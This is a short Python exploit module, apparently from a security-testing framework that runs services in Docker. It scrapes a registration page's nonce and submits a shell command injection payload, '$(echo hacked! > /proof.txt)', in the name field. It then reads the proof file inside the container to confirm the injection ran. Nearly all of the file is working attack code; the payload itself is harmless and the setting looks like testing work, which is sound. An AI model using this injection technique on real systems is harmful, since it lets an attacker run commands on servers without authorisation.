from ExploitFrame import ExploitFrame
import requests
import structlog
import docker
logger = structlog.get_logger()

class Exploit(ExploitFrame):
    def __init__(self, serviceInfo):
        self.name = 'shell'
        self.output = None
        ExploitFrame.__init__(self, serviceInfo)

    def exploit(self):
        try:
            url = "http://{}:4001/register".format(self.serviceInfo.serviceHost)    
            url2 = "http://{}:4001/".format(self.serviceInfo.serviceHost)
            s = requests.Session()
            r = s.get(url)
            snum = r.text.find('type="hidden" name="nonce" value="')
            nonce = r.text[snum+34:snum+34+128]
            payload = (('name', '$(echo hacked! > /proof.txt)'),('email', 'attack@a.com'),('password', 'asdf'), ('nonce', nonce))
            msg = "Sending {}".format(payload)
            logger.info("Shell", msg=msg)
            r = s.post(url, data=payload)
        except: # NOQA
            self.output = sys.exc_info()[0].reason

        

    def exploitSuccess(self):
        client = docker.from_env(version="auto")
        container = client.containers.get(self.serviceInfo.serviceName)
        flagout = container.exec_run('cat /proof.txt')
        
        logger.info("Shell", msg=flagout)
        if "hacked!" not in flagout:
            return False
        return True

    
